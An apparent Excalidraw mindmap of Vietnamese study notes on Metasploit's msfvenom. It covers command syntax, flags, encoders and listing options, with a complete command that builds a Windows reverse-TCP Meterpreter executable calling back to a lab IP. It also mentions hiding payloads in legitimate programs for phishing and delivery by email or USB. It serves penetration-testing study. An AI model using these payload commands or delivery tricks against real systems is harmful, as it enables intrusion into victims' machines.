---
title: "Metasploit- Payload Generation"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-818982ae">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1773 9793" width="1773" height="9793" class="excalidraw-svg" data-width="1773" data-height="9793">
<g transform="translate(-56.74,-107.24)">
<text x="228.60" y="163.24" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="228.60" dy="0">I)Intro</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="271.4609056562984" y="193.88826089869872" width="658.2865627108407" height="677.4518677011563" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="271.4609056562984" y="193.88826089869872" width="658.2865627108407" height="677.4518677011563" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 msfvenom là gì?</span>
      </div>
      <a href="#doc-8f4d62f5ba431cc32be05afdd778350283e33068" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Phần này dạy mày về <strong>msfvenom</strong> – công cụ tạo payload độc lập, dùng khi không có sẵn exploit module để phóng payload tự động.</p>
<h3>📘 msfvenom là gì?</h3>
<ul>
<li>Là <strong>công cụ command-line</strong> của Metasploit, chạy ngoài <code>msfconsole</code>.</li>
<li>Dùng để <strong>tạo ra các file payload</strong> (<code>.exe</code>, <code>.elf</code>, <code>.apk</code>, web shell, shellcode...) để tự đem đi gài vào mục tiêu bằng cách khác: upload, gửi email, USB, SSH...</li>
</ul>
<h3>🧪 Khi nào cần msfvenom?</h3>
<ul>
<li>Có lỗi upload web nhưng không có module exploit tương ứng → tạo web shell (PHP, ASP, JSP) để upload.</li>
<li>Có SSH nhưng muốn nâng cấp lên Meterpreter → tạo file payload rồi chạy trên máy đó.</li>
<li>Cần chèn payload vào file thực thi hợp pháp để lừa nạn nhân (phishing).</li>
</ul>
<h3>🔁 Quy trình dùng msfvenom:</h3>
<ol>
<li><strong>Tạo payload</strong> – chỉ định OS, loại payload, định dạng file, LHOST/LPORT.</li>
<li><strong>Chuyển payload lên mục tiêu</strong> – bằng mọi cách (upload, email, USB...).</li>
<li><strong>Mở listener</strong> trong <code>msfconsole</code> bằng module <code>exploit/multi/handler</code> để chờ kết nối ngược.</li>
<li><strong>Thực thi payload</strong> trên mục tiêu.</li>
<li><strong>Nhận session</strong> và tương tác.</li>
</ol>
<h3>📌 Lịch sử:</h3>
<ul>
<li>Trước đây có hai tool riêng: <code>msfpayload</code> (tạo payload) và <code>msfencode</code> (mã hóa). Năm 2015 gộp lại thành <code>msfvenom</code>.</li>
</ul>
<p>➡️ <strong>Tóm gọn:</strong> msfvenom giúp mày <strong>tự tạo file payload</strong> để gài vào mục tiêu khi không dùng được module exploit có sẵn. Mày phải tự lo phần giao hàng (delivery), còn lại vẫn dùng Metasploit để bắt session.</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M422.59 191.30 C444.42 192.88,464.55 190.38,515.17 190.69 M421.30 191.00 C441.14 190.37,462.79 190.19,514.08 191.91 M513.99 191.27 C513.85 201.96,515.11 216.57,512.01 224.70 M512.33 191.53 C513.31 198.13,514.42 205.70,513.38 224.12 M514.27 223.73 C492.21 223.72,468.02 222.38,421.33 223.12 M512.99 224.62 C489.47 223.34,466.55 225.14,421.68 224.77 M422.63 223.88 C421.87 215.40,422.28 205.81,420.46 189.81 M421.87 224.86 C421.21 210.76,421.23 198.27,421.92 191.20" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M732.33 218.46 C774.57 219.96,821.15 218.69,924.43 221.68 M729.89 219.35 C796.97 220.48,864.69 221.68,923.75 219.75" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M316.65 333.47 C398.27 333.35,475.90 334.39,568.92 333.96 M316.72 333.51 C413.05 332.31,509.94 332.11,569.21 332.27" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M354.61 424.05 C529.43 423.88,704.30 425.40,877.80 427.90 M354.89 423.92 C509.79 424.62,664.21 425.13,878.20 427.57" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="939.27" y="431.24" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#000000" text-anchor="start"><tspan x="939.27" dy="0">dùng khi ko có payload tương ứng</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="949.27" y="479.91" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#000000" text-anchor="start"><tspan x="949.27" dy="0">giả sử mày ko có exploit , thì phải dùng</tspan><tspan x="949.27" dy="20">cái này</tspan><tspan x="949.27" dy="20">=&gt; thì mày sẽ phải dùng msfvenom để</tspan><tspan x="949.27" dy="20">tạo payload và set cho cái exploit</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M624.60 673.91 L626.60 674.57 L628.60 674.57 L629.94 675.24 L632.60 675.91 L637.94 676.57 L639.94 676.57 L644.60 677.24 L648.60 677.24 L653.27 677.24 L657.94 677.24 L662.60 677.24 L667.94 676.57 L672.60 675.91 L677.27 675.24 L680.60 674.57 L683.94 673.91 L685.94 673.24 L687.27 673.24 L687.27 673.24" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M680.60 661.91 L683.27 662.57 L683.27 663.24 L685.27 664.57 L686.60 666.57 L687.94 668.57 L689.27 671.24 L689.94 672.57 L690.60 674.57 L690.60 676.57 L690.60 677.91 L690.60 679.91 L690.60 680.57 L690.60 681.91 L690.60 683.24 L690.60 684.57 L690.60 685.91 L690.60 687.24 L690.60 687.91 L690.60 688.57 L689.94 689.24 L687.94 689.91 L686.60 691.24 L683.94 691.24 L682.60 691.91 L681.27 691.91 L680.60 692.57 L680.60 692.57" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="721.94" y="678.49" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#000000" text-anchor="start"><tspan x="721.94" dy="0">cái này dùng kiểu gì ?? mình cần thực hành thực tế</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M287.32 726.16 C457.82 726.86,627.93 727.28,901.61 727.01 M286.26 726.62 C528.57 727.63,770.40 727.53,901.47 726.87 M902.09 726.29 C902.53 740.09,901.64 751.74,899.74 774.17 M901.49 725.95 C901.63 744.27,902.28 763.76,901.21 775.96 M901.89 774.76 C771.46 773.73,642.13 773.80,286.04 774.95 M901.47 775.54 C735.44 774.18,569.77 774.28,286.22 775.19 M285.17 775.75 C285.85 758.02,287.32 742.74,287.77 725.07 M285.68 774.36 C285.42 764.78,286.84 754.85,286.21 726.71" stroke="#000000" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="207.27" y="905.16" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="207.27" dy="0">II) Cấu trúc lệnh cơ bản của msfvenom</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="276.60412597656256" y="956.1455311584473" width="732.5370875575551" height="2290.0940699768066" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="276.60412597656256" y="956.1455311584473" width="732.5370875575551" height="2290.0940699768066" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Cấu trúc lệnh msfvenom cơ bản</span>
      </div>
      <a href="#doc-4c22e97d17140284bf9c44b382af88c1fc2f3cb9" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, tao sẽ dạy lại phần này cho dễ hiểu, đi từng bước như đang nói chuyện.</p>
<h3>📘 Cấu trúc lệnh msfvenom cơ bản</h3>
<p>Lệnh msfvenom luôn có dạng:</p>
<pre><code>msfvenom -p &lt;payload&gt; LHOST=&lt;IP_của_mày&gt; LPORT=&lt;cổng&gt; -f &lt;định_dạng&gt; -o &lt;tên_file&gt;
</code></pre>
<p>Trong đó:</p>
<ul>
<li><code>-p</code> : chọn payload (loại mã độc sẽ chạy trên máy nạn nhân).</li>
<li><code>LHOST=</code> : IP máy mày (máy tấn công) để nạn nhân gọi về.</li>
<li><code>LPORT=</code> : cổng mày mở để nhận kết nối ngược.</li>
<li><code>-f</code> : định dạng file xuất ra (exe, elf, raw, python...).</li>
<li><code>-o</code> : tên file lưu payload.</li>
</ul>
<p><strong>Ví dụ tạo file <code>shell.exe</code> chạy trên Windows:</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o shell.exe
</code></pre>
<p>Giải thích nhanh:</p>
<ul>
<li>Payload: <code>windows/x64/meterpreter/reverse_tcp</code> (Meterpreter trên Windows 64-bit, kết nối ngược).</li>
<li>IP máy tấn công: <code>10.10.14.12</code>, cổng <code>4444</code>.</li>
<li>Xuất ra file <code>exe</code> tên <code>shell.exe</code>.</li>
</ul>
<h3>📘 Các flag quan trọng</h3>
<table>
<thead>
<tr>
<th>Flag</th>
<th>Ý nghĩa</th>
<th>Ví dụ</th>
</tr>
</thead>
<tbody><tr>
<td><code>-p</code></td>
<td>Chọn payload</td>
<td><code>-p linux/x64/meterpreter/reverse_tcp</code></td>
</tr>
<tr>
<td><code>-f</code></td>
<td>Định dạng output</td>
<td><code>-f exe</code>, <code>-f elf</code>, <code>-f python</code></td>
</tr>
<tr>
<td><code>-o</code></td>
<td>Ghi ra file</td>
<td><code>-o shell.exe</code></td>
</tr>
<tr>
<td><code>-e</code></td>
<td>Chọn encoder</td>
<td><code>-e x86/shikata_ga_nai</code></td>
</tr>
<tr>
<td><code>-i</code></td>
<td>Số lần encode</td>
<td><code>-i 5</code></td>
</tr>
<tr>
<td><code>-b</code></td>
<td>Ký tự cần tránh</td>
<td><code>-b &#39;\x00\x0a\x0d&#39;</code></td>
</tr>
<tr>
<td><code>-x</code></td>
<td>File mẫu để chèn payload vào</td>
<td><code>-x putty.exe</code></td>
</tr>
<tr>
<td><code>-k</code></td>
<td>Giữ nguyên chức năng file mẫu (dùng với <code>-x</code>)</td>
<td><code>-k</code></td>
</tr>
<tr>
<td><code>-a</code></td>
<td>Chỉ định kiến trúc</td>
<td><code>-a x64</code></td>
</tr>
<tr>
<td><code>--platform</code></td>
<td>Chỉ định nền tảng</td>
<td><code>--platform windows</code></td>
</tr>
<tr>
<td><code>-n</code></td>
<td>Thêm NOP sled N bytes phía trước</td>
<td><code>-n 16</code></td>
</tr>
</tbody></table>
<blockquote>
<p>Lưu ý: <code>LHOST</code> và <code>LPORT</code> không phải flag, chúng là <strong>payload options</strong>. Mày truyền thẳng sau <code>-p</code> dạng <code>KEY=VALUE</code>.</p>
</blockquote>
<h3>📘 Liệt kê những thứ có sẵn</h3>
<p>Muốn xem danh sách payload, format, encoder, platform, architecture:</p>
<ul>
<li><p>Xem tất cả payload:</p>
<pre><code class="language-bash">msfvenom -l payloads
</code></pre>
</li>
<li><p>Lọc nhanh bằng <code>grep</code>:</p>
<pre><code class="language-bash">msfvenom -l payloads | grep linux | grep meterpreter
</code></pre>
</li>
<li><p>Xem các định dạng output:</p>
<pre><code class="language-bash">msfvenom -l formats
</code></pre>
<p>Gồm:</p>
<ul>
<li><strong>Executable formats</strong>: <code>exe</code>, <code>elf</code>, <code>dll</code>, <code>msi</code>, <code>apk</code>, <code>war</code>...</li>
<li><strong>Transform formats</strong>: <code>python</code>, <code>powershell</code>, <code>c</code>, <code>raw</code>, <code>base64</code>, <code>hex</code>... (dạng mã nguồn hoặc shellcode để nhúng vào tool khác).</li>
</ul>
</li>
<li><p>Xem encoders:</p>
<pre><code class="language-bash">msfvenom -l encoders
</code></pre>
</li>
<li><p>Xem platforms và architectures:</p>
<pre><code class="language-bash">msfvenom -l platforms
msfvenom -l archs
</code></pre>
</li>
</ul>
<h3>📘 Kiểm tra options của payload</h3>
<p>Muốn biết payload cần những gì (LHOST, LPORT, EXITFUNC...) thì chạy:</p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
</code></pre>
<p>Kết quả sẽ hiện tương tự <code>show options</code> trong msfconsole, cho biết tham số nào bắt buộc, tham số nào có giá trị mặc định.</p>
<p>Ví dụ:</p>
<pre><code>Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique
LHOST                      yes       The listen address
LPORT     4444             yes       The listen port
</code></pre>
<h3>Tóm gọn lại:</h3>
<ul>
<li>Dùng <code>msfvenom -p &lt;payload&gt; LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f &lt;format&gt; -o &lt;file&gt;</code>.</li>
<li><code>-l</code> để liệt kê payload/formats/encoders...</li>
<li><code>--list-options</code> để xem yêu cầu của payload.</li>
<li>Đây là bước tạo file payload thủ công, để tự đem gài vào mục tiêu.</li>
</ul>
<p>Hiểu rồi chứ ông bạn? 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M281.84 1111.86 C462.23 1111.92,641.84 1112.21,952.91 1109.74 M282.89 1112.90 C448.20 1113.09,614.42 1111.96,952.39 1109.15" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M775.21 2213.67 L776.01 2213.38 L776.75 2214.51 L777.87 2217.18 L778.78 2221.63 L779.47 2227.69 L779.74 2231.67 L779.85 2240.23 L779.42 2252.70 L777.77 2272.18 L776.11 2285.61 L774.14 2299.27 L771.85 2312.58 L769.45 2325.41 L768.22 2331.82 L765.71 2344.00 L763.15 2355.76 L760.43 2367.17 L754.99 2388.43 L752.91 2396.39 L751.05 2403.64 L749.18 2410.65 L747.47 2417.30 L745.87 2423.42 L744.59 2428.65 L743.37 2433.52 L742.35 2437.62 L741.45 2441.30 L740.59 2444.74 L739.85 2447.77 L739.58 2449.08 L739.05 2451.58 L738.41 2454.72 L738.19 2455.67 L737.93 2457.10 L737.71 2458.17 L737.71 2458.17" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M811.05 2321.49 L810.09 2321.67 L810.89 2321.96 L811.95 2322.08 L813.18 2322.20 L814.78 2322.44 L816.65 2322.62 L818.14 2322.73 L819.26 2322.85 L820.38 2322.79 L820.38 2322.79" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M810.46 2328.79 L811.10 2328.32 L812.91 2327.72 L814.89 2327.13 L817.07 2326.54 L818.19 2326.24 L818.19 2326.24" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M832.38 2311.86 L833.07 2311.39 L833.82 2311.75 L834.57 2312.58 L834.83 2313.59 L834.94 2315.25 L834.41 2317.92 L833.18 2320.89 L831.31 2323.86 L828.70 2327.13 L827.15 2328.62 L824.01 2331.47 L824.01 2331.47" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="863.58" y="2315.15" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="863.58" dy="0">xem danh sách payload có sẵn ?</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M494.51 2779.41 L493.29 2779.35 L489.13 2779.00 L486.51 2778.88 L483.47 2778.94 L479.90 2779.11 L475.79 2779.65 L471.53 2780.24 L464.27 2781.31 L459.15 2782.14 L454.30 2783.03 L451.95 2783.51 L447.21 2784.64 L442.62 2786.00 L438.19 2787.61 L433.93 2789.33 L430.19 2791.11 L426.73 2793.01 L425.18 2793.96 L422.25 2796.04 L418.41 2799.19 L416.22 2801.15 L414.46 2802.82 L412.86 2804.60 L411.53 2806.32 L410.89 2807.09 L409.77 2808.87 L408.86 2810.48 L408.49 2811.25 L408.06 2812.56 L407.90 2813.75 L408.06 2814.81 L408.81 2816.24 L410.73 2818.68 L412.43 2820.22 L414.30 2821.59 L416.38 2823.01 L418.73 2824.44 L420.06 2825.15 L422.67 2826.58 L425.55 2827.94 L428.86 2829.13 L432.49 2830.38 L436.97 2831.39 L442.03 2832.34 L447.79 2833.11 L453.87 2833.76 L460.06 2834.30 L466.35 2834.89 L472.27 2835.37 L477.98 2835.96 L483.53 2836.44 L486.30 2836.73 L491.79 2837.21 L497.34 2837.45 L503.10 2837.45 L512.43 2837.21 L518.73 2836.91 L521.98 2836.73 L528.06 2836.56 L533.93 2836.32 L539.26 2836.08 L544.01 2836.08 L548.59 2836.08 L552.97 2836.20 L555.10 2836.26 L559.42 2836.32 L563.53 2836.38 L569.87 2836.32 L574.09 2836.20 L578.30 2835.90 L582.46 2835.66 L584.49 2835.55 L588.43 2835.31 L591.63 2835.01 L594.67 2834.65 L597.55 2834.30 L600.06 2833.82 L602.46 2833.29 L603.63 2832.93 L606.83 2831.86 L608.70 2830.97 L610.30 2829.78 L611.63 2828.36 L612.59 2826.81 L612.86 2825.98 L612.97 2824.38 L612.59 2822.42 L611.37 2819.98 L609.29 2817.25 L606.51 2814.46 L601.34 2810.30 L599.31 2808.99 L594.94 2806.50 L589.34 2804.00 L583.10 2801.81 L576.11 2799.85 L568.65 2798.36 L560.70 2797.05 L556.43 2796.46 L548.06 2795.57 L539.74 2794.68 L531.79 2793.91 L520.54 2792.90 L514.09 2792.30 L510.94 2792.06 L504.54 2791.71 L497.98 2791.71 L490.41 2792.12 L486.30 2792.54 L486.30 2792.54" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M696.75 2914.43 L695.74 2913.84 L695.05 2913.36 L694.30 2912.83 L693.66 2912.35 L692.97 2911.94 L692.06 2911.64 L691.15 2911.40 L690.14 2911.10 L689.23 2910.87 L688.27 2910.69 L687.37 2910.51 L686.14 2910.27 L685.07 2910.15 L684.06 2909.97 L683.05 2909.80 L681.98 2909.68 L682.83 2910.27 L686.14 2911.04 L687.58 2911.22 L690.67 2911.58 L694.62 2911.94 L698.89 2912.29 L703.63 2912.59 L709.29 2913.00 L715.15 2913.42 L721.13 2913.84 L727.21 2914.37 L730.14 2914.49 L736.01 2915.02 L744.54 2915.74 L749.13 2916.15 L753.45 2916.63 L757.45 2917.16 L761.18 2917.64 L764.70 2918.17 L767.63 2918.59 L770.46 2919.00 L771.74 2919.30 L774.25 2919.72 L776.54 2920.07 L778.57 2920.37 L780.11 2920.61 L781.29 2920.79 L782.19 2920.96 L783.26 2921.08 L784.33 2921.26 L785.29 2921.38 L786.30 2921.44 L786.30 2921.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1003.15 787.05 L1002.89 786.21 L1003.10 785.32 L1003.79 786.04 L1004.11 787.64 L1004.38 790.25 L1004.59 793.22 L1004.81 796.31 L1005.13 799.58 L1005.39 802.85 L1005.77 805.82 L1006.19 808.67 L1006.67 811.10 L1006.99 812.23 L1007.26 813.18 L1008.06 815.74 L1008.49 816.51 L1008.81 815.80 L1008.70 813.78 L1008.59 812.41 L1008.27 809.32 L1007.85 805.64 L1007.47 801.66 L1007.10 797.74 L1006.83 792.63 L1006.99 789.54 L1007.21 786.87 L1007.63 784.43 L1007.90 783.30 L1008.59 781.40 L1009.55 779.74 L1010.25 778.73 L1010.99 778.08 L1012.01 777.90 L1012.91 778.37 L1014.57 780.63 L1014.99 781.52 L1015.85 783.60 L1016.49 785.74 L1017.02 788.00 L1017.29 790.19 L1017.23 792.16 L1016.81 794.23 L1015.85 796.25 L1014.57 797.98 L1013.77 798.69 L1012.22 799.76 L1010.78 800.23 L1009.71 800.17 L1008.97 799.52 L1008.97 799.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1026.03 795.60 L1026.46 794.77 L1026.62 793.58 L1026.41 792.51 L1025.77 792.10 L1024.81 792.27 L1022.89 793.94 L1021.66 795.48 L1020.33 798.45 L1019.74 800.41 L1019.53 802.08 L1019.58 803.38 L1019.79 804.39 L1020.33 805.16 L1021.23 805.70 L1023.15 804.99 L1024.59 803.68 L1025.82 801.96 L1027.10 799.05 L1027.42 798.10 L1027.69 797.09 L1028.11 795.60 L1028.49 794.59 L1028.70 793.46 L1028.33 794.23 L1028.33 795.30 L1028.59 797.74 L1028.97 799.40 L1029.39 800.59 L1029.93 801.36 L1030.78 801.90 L1031.85 801.60 L1032.43 800.89 L1032.91 800.17 L1033.45 799.46 L1033.34 800.47 L1033.55 801.48 L1033.93 802.37 L1035.95 804.09 L1037.02 804.45 L1038.03 804.39 L1038.94 804.09 L1040.65 802.61 L1041.61 801.01 L1042.30 799.16 L1042.62 797.56 L1042.73 796.25 L1042.83 795.24 L1042.83 794.17 L1042.51 795.07 L1042.46 798.04 L1042.41 800.77 L1042.30 802.08 L1042.09 805.10 L1041.82 808.19 L1041.39 811.28 L1040.59 815.62 L1040.01 818.29 L1039.42 820.67 L1038.57 822.87 L1037.55 824.77 L1037.02 825.54 L1035.79 826.67 L1034.78 827.20 L1033.55 826.67 L1032.70 824.53 L1033.13 821.26 L1034.19 819.00 L1036.01 816.63 L1037.07 815.50 L1038.14 814.37 L1038.14 814.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1059.15 776.83 L1058.46 777.30 L1057.87 778.61 L1057.13 780.87 L1056.38 783.90 L1055.53 787.58 L1054.57 791.50 L1053.77 795.60 L1053.45 797.56 L1052.75 801.48 L1052.27 806.59 L1052.22 809.44 L1052.43 811.76 L1052.70 812.77 L1053.29 814.13 L1053.93 814.91 L1053.93 814.91" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1061.45 808.13 L1061.82 807.42 L1062.03 806.47 L1061.07 806.71 L1060.81 807.54 L1060.75 808.55 L1060.81 809.62 L1061.02 810.63 L1061.45 811.40 L1062.03 812.00 L1063.05 811.94 L1064.01 809.62 L1064.17 808.55 L1064.27 806.71 L1063.95 803.98 L1063.79 802.97 L1063.74 801.90 L1064.11 801.18 L1065.18 800.95 L1067.63 800.89 L1069.77 800.77 L1071.47 800.65 L1072.86 800.59 L1073.93 800.59 L1075.15 800.53 L1076.06 800.77 L1075.74 801.60 L1074.94 802.67 L1073.71 804.27 L1072.11 806.77 L1071.26 808.49 L1070.99 809.26 L1070.46 810.63 L1070.35 811.88 L1070.41 813.18 L1070.83 814.19 L1071.58 814.79 L1072.65 815.02 L1073.55 814.79 L1075.05 813.36 L1076.01 811.46 L1076.65 809.20 L1076.86 807.96 L1077.13 805.70 L1077.29 804.69 L1077.45 803.08 L1077.61 801.90 L1077.61 800.77 L1076.91 801.30 L1076.70 802.37 L1076.59 803.62 L1076.65 804.99 L1076.91 806.47 L1077.29 808.13 L1077.71 809.44 L1078.30 810.33 L1078.94 810.99 L1079.58 811.40 L1079.58 811.40" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1094.73 806.47 L1094.41 805.52 L1093.87 804.75 L1093.13 804.33 L1091.90 804.33 L1090.35 805.28 L1089.55 805.76 L1088.06 807.06 L1086.83 808.61 L1085.82 810.15 L1085.45 810.87 L1085.02 812.00 L1085.13 813.30 L1085.82 813.96 L1087.53 813.66 L1089.77 812.35 L1092.27 810.15 L1095.15 806.77 L1097.87 802.67 L1100.81 797.38 L1103.47 791.92 L1105.34 787.11 L1106.83 782.53 L1107.42 780.63 L1108.27 777.30 L1109.07 773.68 L1109.18 772.73 L1109.18 771.36 L1108.75 770.59 L1107.53 771.96 L1106.62 774.16 L1106.09 775.64 L1105.18 779.09 L1104.49 782.83 L1104.01 786.87 L1103.79 790.91 L1103.69 795.01 L1103.53 800.95 L1103.53 804.69 L1103.53 804.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1264.27 712.02 L1263.37 712.32 L1263.15 713.33 L1262.94 714.87 L1262.73 717.31 L1262.62 720.04 L1262.67 723.07 L1262.73 724.62 L1262.89 727.94 L1263.10 731.80 L1263.37 737.57 L1263.53 741.19 L1263.63 744.57 L1263.69 747.72 L1263.69 750.63 L1263.63 753.31 L1263.63 754.49 L1263.63 755.62 L1263.53 757.41 L1263.53 758.77 L1263.47 759.84 L1263.37 761.09 L1263.37 762.28 L1263.37 763.35 L1263.47 764.47 L1263.37 765.54 L1263.31 766.55 L1263.31 767.68 L1263.37 768.69 L1263.37 768.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1269.07 710.30 L1270.19 710.30 L1273.29 710.54 L1276.65 710.89 L1280.54 711.31 L1286.89 712.20 L1291.79 712.97 L1297.07 713.63 L1299.74 713.92 L1304.75 714.40 L1309.39 714.76 L1313.77 714.99 L1317.87 715.05 L1321.34 715.05 L1324.49 715.05 L1327.21 714.99 L1329.39 714.87 L1332.27 714.76 L1333.66 714.76 L1334.89 714.81 L1335.95 714.99 L1336.38 715.82 L1336.27 719.21 L1336.06 722.12 L1335.79 725.57 L1335.53 729.43 L1335.31 733.47 L1335.21 735.49 L1334.99 739.76 L1334.89 743.98 L1334.67 748.20 L1334.51 752.30 L1334.30 756.46 L1334.09 760.32 L1333.87 763.94 L1333.71 768.57 L1333.71 770.00 L1333.77 772.49 L1333.77 773.56 L1333.77 775.23 L1333.87 776.47 L1333.87 776.47" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1273.23 775.88 L1274.19 776.18 L1276.27 776.29 L1279.74 776.53 L1284.27 776.71 L1289.98 777.01 L1296.17 777.25 L1305.39 777.36 L1308.49 777.48 L1313.93 777.48 L1318.73 777.48 L1322.89 777.48 L1326.19 777.36 L1328.97 777.25 L1331.21 777.01 L1331.21 777.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1288.75 670.38 L1288.65 669.49 L1288.54 670.56 L1288.49 671.75 L1288.33 675.97 L1288.06 678.94 L1287.74 682.08 L1287.47 685.11 L1287.21 687.97 L1286.99 690.58 L1286.83 692.84 L1286.78 694.56 L1286.83 695.75 L1287.05 696.76 L1287.05 696.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1279.47 672.94 L1279.26 671.93 L1279.26 670.74 L1279.58 669.85 L1280.54 669.19 L1282.51 668.60 L1284.75 668.18 L1287.10 668.01 L1289.50 668.13 L1291.79 668.48 L1293.87 669.02 L1296.70 670.20 L1296.70 670.20" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
